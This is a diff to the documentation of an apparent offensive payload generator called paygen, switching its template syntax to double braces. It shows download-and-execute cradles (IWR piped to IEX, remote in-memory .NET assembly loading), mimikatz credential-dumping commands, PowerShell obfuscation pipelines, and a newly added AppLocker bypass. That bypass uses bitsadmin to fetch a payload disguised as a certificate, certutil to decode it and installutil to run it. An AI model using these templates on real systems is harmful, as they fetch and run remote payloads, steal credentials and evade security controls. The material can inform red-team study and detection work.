@@ -818,23 +818,23 @@ Defines obfuscation methods with templated command strings for the `psobf` tool.
 
 | Variable | Description | Example |
 |----------|-------------|---------|
-| `{temp}` | Input file path (temporary file) | `/tmp/script_abc123.ps1` |
-| `{out}` | Output file path (obfuscated result) | `/tmp/script_obf_xyz789.ps1` |
-| `{hex_key}` | Random hex string for encryption | `A1B2C3D4E5F6` |
-| `{string_dict}` | Random number 0-100 for string dictionary | `75` |
-| `{dead_code}` | Random number 0-100 for dead code injection | `50` |
-| `{seed}` | Random number 0-10000 for randomization seed | `4832` |
+| `{{ temp }}` | Input file path (temporary file) | `/tmp/script_abc123.ps1` |
+| `{{ out }}` | Output file path (obfuscated result) | `/tmp/script_obf_xyz789.ps1` |
+| `{{ hex_key }}` | Random hex string for encryption | `A1B2C3D4E5F6` |
+| `{{ string_dict }}` | Random number 0-100 for string dictionary | `75` |
+| `{{ dead_code }}` | Random number 0-100 for dead code injection | `50` |
+| `{{ seed }}` | Random number 0-10000 for randomization seed | `4832` |
 
 **Example:**
 ```yaml
 - name: High - Maximum obfuscation
-  command: psobf -i {temp} -o {out} -q -level 5 -pipeline "hex_aes:{hex_key}|string_dict:{string_dict}|dead_code:{dead_code}" -seed {seed}
+  command: psobf -i {{ temp }} -o {{ out }} -q -level 5 -pipeline "hex_aes:{{ hex_key }}|string_dict:{{ string_dict }}|dead_code:{{ dead_code }}" -seed {{ seed }}
 
 - name: Medium - Balanced obfuscation
-  command: psobf -i {temp} -o {out} -q -level 3 -pipeline "string_dict:{string_dict}|dead_code:{dead_code}" -seed {seed}
+  command: psobf -i {{ temp }} -o {{ out }} -q -level 3 -pipeline "string_dict:{{ string_dict }}|dead_code:{{ dead_code }}" -seed {{ seed }}
 
 - name: Low - Light obfuscation
-  command: psobf -i {temp} -o {out} -q -level 1 -pipeline "string_dict:{string_dict}" -seed {seed}
+  command: psobf -i {{ temp }} -o {{ out }} -q -level 1 -pipeline "string_dict:{{ string_dict }}" -seed {{ seed }}
 ```
 
 ### ps-features.yaml
@@ -855,12 +855,12 @@ Defines AMSI bypasses and download cradles with optional obfuscation control.
 
 **Code vs Command:**
 
-Features can use either `code` or `command` field:
+Features can use `code`, `command`, or both:
 
 - **code** - Static template with variable substitution
   - Content is used directly as output
-  - Variables like `{url}`, `{args}` are replaced
-  - Conditional blocks `{if args}...{fi}` are processed
+  - Variables like `{{ url }}`, `{{ args }}` are replaced
+  - Conditional blocks `{{ if args }}...{{ fi }}` are processed
   - No command execution
 
 - **command** - Dynamic generation via shell execution
@@ -868,6 +868,12 @@ Features can use either `code` or `command` field:
   - Variables are replaced BEFORE execution
   - Useful for tools like CradleCrafter, Invoke-Obfuscation, etc.
   - Errors show command and stderr for debugging
+
+- **command + code** - Command for setup, code for output
+  - Command is executed for side effects (e.g., creating files)
+  - Command output is ignored
+  - The `code` field is used as the cradle output
+  - Useful for encoding payloads, generating certificates, etc.
 
 **Types:**
 
@@ -880,42 +886,43 @@ Features can use either `code` or `command` field:
 
 | Variable | Description | Example | Required |
 |----------|-------------|---------|----------|
-| `{url}` | Base URL constructed from lhost/lport (without filename) | `http://192.168.1.100:8080` or `https://192.168.1.100` | Always |
-| `{output_file}` | Output filename from payload parameters | `payload.exe` | Always |
-| `{namespace}` | .NET namespace for assembly loading | `MyApp` | Optional |
-| `{class}` | .NET class name containing entry point | `Program` | Optional |
-| `{entry_point}` | Entry point method/function name | `Main` or `DllMain` | Optional |
-| `{args}` | Command-line arguments for assembly invocation | `arg1 arg2` | Optional |
+| `{{ url }}` | Base URL constructed from lhost/lport (without filename) | `http://192.168.1.100:8080` or `https://192.168.1.100` | Always |
+| `{{ output_file }}` | Output filename from payload parameters | `payload.exe` | Always |
+| `{{ output_path }}` | Full path to the output directory | `/home/user/payloads` | Always |
+| `{{ namespace }}` | .NET namespace for assembly loading | `MyApp` | Optional |
+| `{{ class }}` | .NET class name containing entry point | `Program` | Optional |
+| `{{ entry_point }}` | Entry point method/function name | `Main` or `DllMain` | Optional |
+| `{{ args }}` | Command-line arguments for assembly invocation | `arg1 arg2` | Optional |
 
 **URL Construction Logic:**
 
-The `{url}` variable contains only the base URL without the output filename:
+The `{{ url }}` variable contains only the base URL without the output filename:
 
-- Port 80: `http://{lhost}`
-- Port 443: `https://{lhost}`
-- Other ports: `http://{lhost}:{lport}`
+- Port 80: `http://{{ lhost }}`
+- Port 443: `https://{{ lhost }}`
+- Other ports: `http://{{ lhost }}:{{ lport }}`
 
-In YAML cradle templates, combine `{url}` with `{output_file}` like: `{url}/{output_file}`
+In YAML cradle templates, combine `{{ url }}` with `{{ output_file }}` like: `{{ url }}/{{ output_file }}`
 
 **Assembly Loading Variables:**
 
-The optional variables `{namespace}`, `{class}`, `{entry_point}`, and `{args}` are used for advanced scenarios like in-memory assembly loading and invocation.
+The optional variables `{{ namespace }}`, `{{ class }}`, `{{ entry_point }}`, and `{{ args }}` are used for advanced scenarios like in-memory assembly loading and invocation.
 
 **Auto-Extraction Behavior:**
 - When these variables are present in a cradle, paygen automatically extracts the values from the compiled C# payload
 - If C# obfuscation is enabled, the extracted names will be the obfuscated versions (e.g., "forest", "tree")
 - A checkbox allows manual override to specify custom values (disabled when C# obfuscation is active)
-- The `{args}` variable always requires manual input as it's runtime-specific
+- The `{{ args }}` variable always requires manual input as it's runtime-specific
 
 **Variable Description:**
-- `{namespace}` - .NET namespace of the compiled assembly (e.g., "MyApp")
-- `{class}` - Class name containing the entry point (e.g., "Program")
-- `{entry_point}` - Entry point method name (e.g., "Main", "DllMain")
-- `{args}` - Command-line arguments for the payload (space-separated)
+- `{{ namespace }}` - .NET namespace of the compiled assembly (e.g., "MyApp")
+- `{{ class }}` - Class name containing the entry point (e.g., "Program")
+- `{{ entry_point }}` - Entry point method name (e.g., "Main", "DllMain")
+- `{{ args }}` - Command-line arguments for the payload (space-separated)
 
 **Conditional Blocks:**
 
-Variables can be wrapped in conditional blocks to avoid empty values in the generated code. Use the syntax `{if varname}content{fi}`:
+Variables can be wrapped in conditional blocks to avoid empty values in the generated code. Use the syntax `{{ if varname }}content{{ fi }}`:
 
 - If the variable has a value, the content is included (without the markers)
 - If the variable is empty or not provided, the entire block is removed
@@ -923,7 +930,7 @@ Variables can be wrapped in conditional blocks to avoid empty values in the gene
 **Example:**
 ```yaml
 # Template with conditional args
-mimikatz {if args}"{args}"{fi} "privilege::debug"
+mimikatz {{ if args }}"{{ args }}"{{ fi }} "privilege::debug"
 
 # With args="sekurlsa::logonpasswords":
 # Output: mimikatz "sekurlsa::logonpasswords" "privilege::debug"
@@ -939,7 +946,7 @@ This avoids generating commands with empty quotes like `mimikatz "" "privilege::
 - name: IWR-IEX (Standard)
   type: cradle-ps1
   code: |
-    IWR -Uri "{url}/{output_file}" -UseBasicParsing | IEX
+    IWR -Uri "{{ url }}/{{ output_file }}" -UseBasicParsing | IEX
 ```
 
 **Example - Assembly Loading with Arguments:**
@@ -947,10 +954,22 @@ This avoids generating commands with empty quotes like `mimikatz "" "privilege::
 - name: Assembly-Load-Invoke (EXE)
   type: cradle-exe
   code: |
-    $data = (New-Object System.Net.WebClient).DownloadData('{url}/{output_file}');
+    $data = (New-Object System.Net.WebClient).DownloadData('{{ url }}/{{ output_file }}');
     $assem = [System.Reflection.Assembly]::Load($data);
-    [{namespace}.{class}]::{entry_point}("{args}".Split())
+    [{{ namespace }}.{{ class }}]::{{ entry_point }}("{{ args }}".Split())
 ```
+
+**Example - Command + Code (AppLocker Bypass):**
+```yaml
+- name: AppLocker Bypass - InstallUtil+Bitsadmin (EXE)
+  type: cradle-exe
+  no-obf: false
+  command: |
+    { echo "-----BEGIN CERTIFICATE-----"; base64 -w 64 {{ output_path }}/{{ output_file }}; echo "-----END CERTIFICATE-----"; } > {{ output_path }}/file.txt
+  code: |
+    cmd.exe /c del C:\Windows\Tasks\enc.txt && del c:\Windows\Tasks\a.exe && bitsadmin /Transfer theJob {{ url }}/file.txt C:\Windows\Tasks\enc.txt && certutil -decode C:\Windows\Tasks\enc.txt C:\Windows\Tasks\a.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\a.exe
+```
+*This example runs a command to base64-encode the payload and wrap it in certificate format, then uses the code field for the download/decode/execute cradle.*
 
 **Example - DLL with Entry Point:**
 ```yaml
